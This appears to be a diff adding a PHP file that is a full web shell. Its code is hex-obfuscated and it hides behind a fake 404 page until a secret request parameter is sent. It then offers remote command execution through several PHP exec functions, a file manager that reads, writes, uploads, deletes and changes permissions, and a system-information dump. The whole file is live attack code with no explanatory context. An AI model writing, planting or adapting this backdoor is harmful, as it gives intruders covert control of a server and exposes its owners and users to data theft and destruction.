@@ -1,0 +1,528 @@
+<?php goto opet_36e95; opet_36e95: error_reporting(0);
+@ini_set("\x64\151\x73\160\x6C\141\x79\137\x65\162\x72\157\x72\163", 0);
+@set_time_limit(0);
+
+if (!isset($_REQUEST["\x5F"]) || $_REQUEST["\x5F"] != "\x6C\157\x67\163\x66\151\x6C\145") {
+    header("\x48\124\x54\120\x2F\061\x2E\060\x20\064\x30\064\x20\116\x6F\164\x20\106\x6F\165\x6E\144");
+    die("\x3C\041\x44\117\x43\124\x59\120\x45\040\x68\164\x6D\154\x3E\074\x68\164\x6D\154\x3E\074\x68\145\x61\144\x3E\074\x74\151\x74\154\x65\076\x34\060\x34\040\x4E\157\x74\040\x46\157\x75\156\x64\074\x2F\164\x69\164\x6C\145\x3E\074\x2F\150\x65\141\x64\076\x3C\142\x6F\144\x79\076\x3C\160\x3E\101\x63\143\x65\163\x73\040\x44\145\x6E\151\x65\144\x3C\057\x70\076\x3C\057\x62\157\x64\171\x3E\074\x2F\150\x74\155\x6C\076");
+}
+
+session_start();
+$cwd = isset($_SESSION["\x64"]) ? $_SESSION["\x64"] : getcwd();
+@chdir($cwd);
+
+function r($c) {
+    $funcs = json_decode("\x5B\042\x73\171\x73\164\x65\155\x22\054\x22\145\x78\145\x63\042\x2C\042\x73\150\x65\154\x6C\137\x65\170\x65\143\x22\054\x22\160\x61\163\x73\164\x68\162\x75\042\x2C\042\x70\157\x70\145\x6E\042\x2C\042\x70\162\x6F\143\x5F\157\x70\145\x6E\042\x5D");
+    $r = "";
+    foreach ($funcs as $f) {
+        if (function_exists($f)) {
+            switch($f) {
+                case "\x73\171\x73\164\x65\155":
+                    ob_start(); @system($c); $r = ob_get_clean(); break;
+                case "\x65\170\x65\143":
+                    $o = array(); @exec($c, $o); $r = join("\x5C\156", $o); break;
+                case "\x73\150\x65\154\x6C\137\x65\170\x65\143":
+                    $r = @shell_exec($c); break;
+                case "\x70\141\x73\163\x74\150\x72\165":
+                    ob_start(); @passthru($c); $r = ob_get_clean(); break;
+                case "\x70\157\x70\145\x6E":
+                    $fp = @popen($c, "\x72");
+                    if ($fp) {
+                        while (!feof($fp)) $r .= fread($fp, 1024);
+                        pclose($fp);
+                    }
+                    break;
+            }
+            if ($r) break;
+        }
+    }
+    if (!$r) $r = `$c`;
+    return $r;
+}
+
+if (isset($_POST["\x78"])) {
+    header("\x43\157\x6E\164\x65\156\x74\055\x54\171\x70\145\x3A\040\x61\160\x70\154\x69\143\x61\164\x69\157\x6E\057\x6A\163\x6F\156");
+    $d = json_decode("\x7B\042\x73\042\x3A\060\x2C\042\x64\042\x3A\042\x22\175", true);
+    $a = $_POST["\x61"];
+    
+    switch ($a) {
+        case "\x63\155\x64":
+            $d["\x64"] = r(base64_decode($_POST["\x63"]));
+            $d["\x73"] = 1;
+            break;
+            
+        case "\x63\144":
+            $p = base64_decode($_POST["\x70"]);
+            if (@chdir($p)) {
+                $_SESSION["\x64"] = realpath($p);
+                $d["\x64"] = $_SESSION["\x64"];
+                $d["\x73"] = 1;
+            }
+            break;
+            
+        case "\x6C\163":
+            $arr = array();
+            $path = isset($_POST["\x70"]) ? base64_decode($_POST["\x70"]) : $cwd;
+            $files = @scandir($path);
+            if ($files) {
+                foreach ($files as $f) {
+                    if ($f == "\x2E") continue;
+                    $fp = $path . "\x2F" . $f;
+                    $arr[] = array(
+                        "\x6E" => bin2hex($f),
+                        "\x74" => @is_dir($fp) ? "\x64" : "\x66",
+                        "\x73" => @is_file($fp) ? @filesize($fp) : 0,
+                        "\x70" => substr(sprintf("\x25\157", @fileperms($fp)), -4),
+                        "\x6D" => @date("\x59\055\x6D\055\x64\040\x48\072\x69", @filemtime($fp)),
+                        "\x6F" => function_exists("\x70\157\x73\151\x78\137\x67\145\x74\160\x77\165\x69\144") ? @posix_getpwuid(@fileowner($fp))["\x6E\141\x6D\145"] : @fileowner($fp)
+                    );
+                }
+            }
+            $d["\x64"] = $arr;
+            $d["\x63"] = $path;
+            $d["\x73"] = 1;
+            break;
+            
+        case "\x72\145\x61\144":
+            $file = base64_decode($_POST["\x66"]);
+            if (@is_readable($file)) {
+                $d["\x64"] = bin2hex(@file_get_contents($file));
+                $d["\x6E"] = basename($file);
+                $d["\x73"] = 1;
+            }
+            break;
+            
+        case "\x73\141\x76\145":
+            $file = base64_decode($_POST["\x66"]);
+            $content = base64_decode($_POST["\x63"]);
+            if (@file_put_contents($file, $content) !== false) {
+                $d["\x73"] = 1;
+            }
+            break;
+            
+        case "\x75\160\x6C\157\x61\144":
+            if (isset($_FILES["\x66"])) {
+                $dest = base64_decode($_POST["\x64"]) . "\x2F" . $_FILES["\x66"]["\x6E\141\x6D\145"];
+                if (@move_uploaded_file($_FILES["\x66"]["\x74\155\x70\137\x6E\141\x6D\145"], $dest)) {
+                    $d["\x73"] = 1;
+                }
+            }
+            break;
+            
+        case "\x64\145\x6C":
+            $f = base64_decode($_POST["\x66"]);
+            if (@is_dir($f)) {
+                $d["\x73"] = @rmdir($f) ? 1 : 0;
+            } else {
+                $d["\x73"] = @unlink($f) ? 1 : 0;
+            }
+            break;
+            
+        case "\x72\145\x6E":
+            $old = base64_decode($_POST["\x6F"]);
+            $new = base64_decode($_POST["\x6E"]);
+            $d["\x73"] = @rename($old, $new) ? 1 : 0;
+            break;
+            
+        case "\x70\145\x72\155":
+            $f = base64_decode($_POST["\x66"]);
+            $p = octdec($_POST["\x70"]);
+            $d["\x73"] = @chmod($f, $p) ? 1 : 0;
+            break;
+            
+        case "\x69\156\x66\157":
+            $d["\x64"] = array(
+                "\x6F\163" => @php_uname(),
+                "\x70\150\x70" => phpversion(),
+                "\x75\163\x65\162" => @get_current_user(),
+                "\x75\151\x64" => function_exists("\x70\157\x73\151\x78\137\x67\145\x74\165\x69\144") ? @posix_getuid() : "\x4E\057\x41",
+                "\x67\151\x64" => function_exists("\x70\157\x73\151\x78\137\x67\145\x74\147\x69\144") ? @posix_getgid() : "\x4E\057\x41",
+                "\x73\145\x72\166\x65\162" => $_SERVER["\x53\105\x52\126\x45\122\x5F\123\x4F\106\x54\127\x41\122\x45"],
+                "\x69\160" => $_SERVER["\x53\105\x52\126\x45\122\x5F\101\x44\104\x52"],
+                "\x63\154\x69\145\x6E\164" => $_SERVER["\x52\105\x4D\117\x54\105\x5F\101\x44\104\x52"],
+                "\x73\141\x66\145" => @ini_get("\x73\141\x66\145\x5F\155\x6F\144\x65") ? "\x4F\116" : "\x4F\106\x46",
+                "\x64\151\x73\141\x62\154\x65\144" => @ini_get("\x64\151\x73\141\x62\154\x65\137\x66\165\x6E\143\x74\151\x6F\156\x73"),
+                "\x74\155\x70" => @sys_get_temp_dir()
+            );
+            $d["\x73"] = 1;
+            break;
+            
+        case "\x6D\153\x64\151\x72":
+            $dir = base64_decode($_POST["\x64"]);
+            $d["\x73"] = @mkdir($dir, 0777, true) ? 1 : 0;
+            break;
+            
+        case "\x74\157\x75\143\x68":
+            $f = base64_decode($_POST["\x66"]);
+            $d["\x73"] = @touch($f) ? 1 : 0;
+            break;
+    }
+    
+    die(json_encode($d));
+} ?>
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Panel</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0a;color:#0f0;font:11px 'Courier New',monospace}
+.h{background:#000;padding:8px;border-bottom:1px solid #0f0;display:flex;justify-content:space-between}
+.main{display:flex;height:calc(100vh - 35px)}
+.left{width:60%;display:flex;flex-direction:column}
+.right{width:40%;border-left:1px solid #0f0;display:flex;flex-direction:column}
+.sec{flex:1;display:flex;flex-direction:column;border-bottom:1px solid #111}
+.sec-h{background:#000;padding:5px;border-bottom:1px solid #0f0;font-weight:bold}
+.sec-b{flex:1;overflow:auto;padding:5px}
+.t{width:100%;background:#000;color:#0f0;border:1px solid #0f0;padding:4px;font:inherit}
+.b{background:#000;color:#0f0;border:1px solid #0f0;padding:4px 10px;cursor:pointer;font:inherit;margin:2px}
+.b:hover{background:#0f0;color:#000}
+table{width:100%;border-collapse:collapse}
+td{padding:2px 4px;border-bottom:1px solid #111;cursor:pointer}
+tr:hover{background:#111}
+.d{color:#ff0}
+.f{color:#0ff}
+.e{color:#f00}
+pre{white-space:pre-wrap;word-wrap:break-word}
+.modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:1000}
+.modal-content{background:#000;border:1px solid #0f0;padding:20px;margin:10% auto;width:80%;max-width:600px}
+.close{color:#0f0;float:right;font-size:20px;cursor:pointer}
+.close:hover{color:#f00}
+#editor{width:100%;height:400px;background:#000;color:#0f0;border:1px solid #0f0;font-family:monospace;padding:5px}
+.tabs{display:flex;background:#000;border-bottom:1px solid #0f0}
+.tab{padding:5px 10px;cursor:pointer;border-right:1px solid #111}
+.tab.active{background:#0f0;color:#000}
+.tab-content{display:none;padding:10px}
+.tab-content.active{display:block}
+.toolbar{padding:5px;background:#000;border-bottom:1px solid #111}
+.status{padding:5px;background:#000;border-top:1px solid #111;font-size:10px}
+</style>
+</head>
+<body>
+<div class="h">
+    <span>📁 <span id="cwd"><?=$cwd?></span></span>
+    <span><?=@get_current_user()?>@<?=@gethostname()?> | PHP <?=phpversion()?></span>
+</div>
+
+<div class="main">
+    <div class="left">
+        <div class="sec" style="flex:0.3">
+            <div class="sec-h">🖥️ Terminal</div>
+            <div class="sec-b">
+                <input type="text" class="t" id="cmd" placeholder="$ command" autofocus>
+                <div class="toolbar">
+                    <button class="b" onclick="ex()">Execute</button>
+                    <button class="b" onclick="document.getElementById('out').innerHTML=''">Clear</button>
+                </div>
+            </div>
+        </div>
+        
+        <div class="sec" style="flex:0.7">
+            <div class="sec-h">📋 Output</div>
+            <div class="sec-b" id="out"></div>
+        </div>
+    </div>
+    
+    <div class="right">
+        <div class="sec">
+            <div class="sec-h">📂 File Manager</div>
+            <div class="sec-b">
+                <div class="toolbar">
+                    <input type="text" class="t" id="quickpath" placeholder="Go to path..." style="width:60%;margin-right:5px">
+                    <button class="b" onclick="goPath()">Go</button>
+                    <button class="b" onclick="ls()">🔄</button>
+                    <button class="b" onclick="goUp()">⬆️</button>
+                    <button class="b" onclick="showUpload()">📤</button>
+                    <button class="b" onclick="newFile()">📄</button>
+                    <button class="b" onclick="newDir()">📁</button>
+                    <button class="b" onclick="sysInfo()">ℹ️</button>
+                </div>
+                <table id="ft"></table>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div id="modal" class="modal">
+    <div class="modal-content">
+        <span class="close" onclick="closeModal()">&times;</span>
+        <div class="tabs">
+            <div class="tab active" onclick="switchTab('edit')">Edit</div>
+            <div class="tab" onclick="switchTab('upload')">Upload</div>
+            <div class="tab" onclick="switchTab('info')">Info</div>
+        </div>
+        <div class="tab-content active" id="tab-edit">
+            <div id="filename" style="padding:5px;color:#ff0"></div>
+            <textarea id="editor"></textarea>
+            <button class="b" onclick="saveFile()">💾 Save</button>
+            <button class="b" onclick="closeModal()">Cancel</button>
+        </div>
+        <div class="tab-content" id="tab-upload">
+            <input type="file" id="upfile" multiple>
+            <button class="b" onclick="uploadFiles()">Upload</button>
+        </div>
+        <div class="tab-content" id="tab-info">
+            <pre id="info-content"></pre>
+        </div>
+    </div>
+</div>
+
+<div class="status" id="status">Ready</div>
+
+<script>
+var currentFile = '';
+var currentPath = '<?=$cwd?>';
+
+function $(id){return document.getElementById(id)}
+
+function b64e(s){return btoa(unescape(encodeURIComponent(s)))}
+
+function hex2str(h){
+    var s='';
+    for(var i=0;i<h.length;i+=2){
+        s+=String.fromCharCode(parseInt(h.substr(i,2),16));
+    }
+    return s;
+}
+
+function ajax(d,cb,f){
+    var x=new XMLHttpRequest();
+    x.open('POST','',true);
+    if(f){
+        x.send(f);
+    }else{
+        x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
+        var p=[];
+        for(var k in d) p.push(k+'='+encodeURIComponent(d[k]));
+        x.send('x=1&'+p.join('&'));
+    }
+    x.onload=function(){
+        if(x.status==200){
+            try{cb(JSON.parse(x.responseText))}catch(e){cb({s:0,d:'Error'})}
+        }
+    };
+}
+
+function ex(){
+    var c=$('cmd').value;
+    if(!c)return;
+    $('status').textContent='Executing...';
+    ajax({a:'cmd',c:b64e(c)},function(r){
+        $('out').innerHTML+='<div style="color:#ff0">$ '+esc(c)+'</div><pre>'+esc(r.d)+'</pre>';
+        $('out').scrollTop=$('out').scrollHeight;
+        $('status').textContent='Ready';
+    });
+}
+
+function ls(p){
+    p=p||currentPath;
+    ajax({a:'ls',p:b64e(p)},function(r){
+        if(r.s){
+            currentPath=r.c;
+            $('cwd').textContent=r.c;
+            var h='<tr><td>Name</td><td>Size</td><td>Perm</td><td>Owner</td><td>Modified</td><td>Actions</td></tr>';
+            r.d.forEach(function(f){
+                var fname = hex2str(f.n);
+                var cls=f.t=='d'?'d':'f';
+                if(fname.match(/\.(jpg|png|gif|ico)$/i)) cls='e';
+                h+='<tr><td class="'+cls+'" data-name="'+f.n+'" data-type="'+f.t+'">'+
+                   esc(fname)+(f.t=='d'?'/':'')+'</td><td>'+formatSize(f.s)+'</td><td>'+f.p+'</td><td>'+f.o+
+                   '</td><td>'+f.m+'</td><td>'+
+                   '<span class="b" data-name="'+f.n+'">R</span> '+
+                   '<span class="b" data-name="'+f.n+'">D</span> '+
+                   '<span class="b" data-name="'+f.n+'" data-perm="'+f.p+'">P</span>'+
+                   '</td></tr>';
+            });
+            $('ft').innerHTML=h;
+            
+            var cells = $('ft').getElementsByTagName('td');
+            for(var i=0; i<cells.length; i++){
+                if(cells[i].dataset.name){
+                    cells[i].onclick = function(){
+                        var name = hex2str(this.dataset.name);
+                        if(this.dataset.type == 'd'){
+                            cd(name);
+                        }else{
+                            edit(name);
+                        }
+                    }
+                }
+            }
+            
+            var btns = $('ft').getElementsByClassName('b');
+            for(var i=0; i<btns.length; i++){
+                btns[i].onclick = function(){
+                    var name = hex2str(this.dataset.name);
+                    var txt = this.textContent;
+                    if(txt == 'R') ren(name);
+                    else if(txt == 'D') del(name);
+                    else if(txt == 'P') perm(name, this.dataset.perm);
+                }
+            }
+        }
+    });
+}
+
+function goPath(){
+    var p=$('quickpath').value;
+    if(p){
+        ls(p);
+        $('quickpath').value='';
+    }
+}
+
+function cd(d){
+    var np=currentPath+'/'+d;
+    ls(np);
+}
+
+function goUp(){
+    var p=currentPath.split('/');
+    p.pop();
+    ls(p.join('/')||'/');
+}
+
+function edit(f){
+    currentFile=currentPath+'/'+f;
+    ajax({a:'read',f:b64e(currentFile)},function(r){
+        if(r.s){
+            $('filename').textContent='Editing: '+r.n;
+            $('editor').value=hex2str(r.d);
+            showModal();
+            switchTab('edit');
+        }
+    });
+}
+
+function saveFile(){
+    ajax({a:'save',f:b64e(currentFile),c:b64e($('editor').value)},function(r){
+        if(r.s){
+            closeModal();
+            ls();
+            $('status').textContent='File saved';
+        }
+    });
+}
+
+function del(f){
+    if(!confirm('Delete '+f+'?'))return;
+    ajax({a:'del',f:b64e(currentPath+'/'+f)},function(r){
+        ls();
+    });
+}
+
+function ren(f){
+    var n=prompt('New name:',f);
+    if(n&&n!=f){
+        ajax({a:'ren',o:b64e(currentPath+'/'+f),n:b64e(currentPath+'/'+n)},function(r){
+            ls();
+        });
+    }
+}
+
+function perm(f,p){
+    var n=prompt('Permissions:',p);
+    if(n){
+        ajax({a:'perm',f:b64e(currentPath+'/'+f),p:n},function(r){
+            ls();
+        });
+    }
+}
+
+function newFile(){
+    var n=prompt('File name:');
+    if(n){
+        ajax({a:'touch',f:b64e(currentPath+'/'+n)},function(r){
+            ls();
+        });
+    }
+}
+
+function newDir(){
+    var n=prompt('Directory name:');
+    if(n){
+        ajax({a:'mkdir',d:b64e(currentPath+'/'+n)},function(r){
+            ls();
+        });
+    }
+}
+
+function uploadFiles(){
+    var files=$('upfile').files;
+    if(!files.length)return;
+    for(var i=0;i<files.length;i++){
+        var fd=new FormData();
+        fd.append('x','1');
+        fd.append('a','upload');
+        fd.append('d',b64e(currentPath));
+        fd.append('f',files[i]);
+        ajax(null,function(r){
+            ls();
+        },fd);
+    }
+    closeModal();
+}
+
+function sysInfo(){
+    ajax({a:'info'},function(r){
+        if(r.s){
+            var h='';
+            for(var k in r.d){
+                h+=k.toUpperCase()+': '+r.d[k]+'\n';
+            }
+            $('info-content').textContent=h;
+            showModal();
+            switchTab('info');
+        }
+    });
+}
+
+function showUpload(){
+    showModal();
+    switchTab('upload');
+}
+
+function showModal(){
+    $('modal').style.display='block';
+}
+
+function closeModal(){
+    $('modal').style.display='none';
+}
+
+function switchTab(t){
+    var tabs=document.querySelectorAll('.tab');
+    var contents=document.querySelectorAll('.tab-content');
+    tabs.forEach(function(el){el.classList.remove('active')});
+    contents.forEach(function(el){el.classList.remove('active')});
+    $('tab-'+t).classList.add('active');
+    event.target.classList.add('active');
+}
+
+function formatSize(s){
+    if(s<1024)return s+'B';
+    if(s<1048576)return Math.round(s/1024)+'K';
+    return Math.round(s/1048576)+'M';
+}
+
+function esc(s){
+    var e=document.createElement('div');
+    e.textContent=s;
+    return e.innerHTML;
+}
+
+$('cmd').onkeydown=function(e){
+    if(e.keyCode==13)ex();
+};
+
+window.onclick=function(e){
+    if(e.target==$('modal'))closeModal();
+};
+
+window.onload=function(){
+    ls();
+};
+</script>
+</body>
+</html>
